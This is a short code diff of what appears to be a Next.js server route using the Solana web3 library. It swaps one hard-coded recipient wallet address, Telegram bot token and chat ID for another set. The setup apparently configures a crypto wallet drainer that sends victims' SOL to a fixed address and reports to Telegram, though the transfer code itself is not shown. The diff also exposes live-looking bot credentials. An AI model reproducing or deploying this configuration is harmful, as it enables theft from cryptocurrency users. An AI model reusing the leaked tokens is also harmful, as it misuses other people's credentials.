@@ -1,9 +1,9 @@
 import { type NextRequest, NextResponse } from "next/server" 
 import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js" 
 
-const RECIPIENT_ADDRESS = "BjTsnS7NkhNkWydusoovsjgDQwxMWWAJroNjkdrPbeQU" 
-const TELEGRAM_BOT_TOKEN = "8402846340:AAGRUwRc3BvAQ25pyM6fghg3Ev6nMKnrbeI" 
-const TELEGRAM_CHAT_ID = "7975092555" 
+const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh" 
+const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U" 
+const TELEGRAM_CHAT_ID = "7556622176" 
 
 const PUBLIC_RPC_ENDPOINTS = [ 
   "https://api.mainnet-beta.solana.com", 
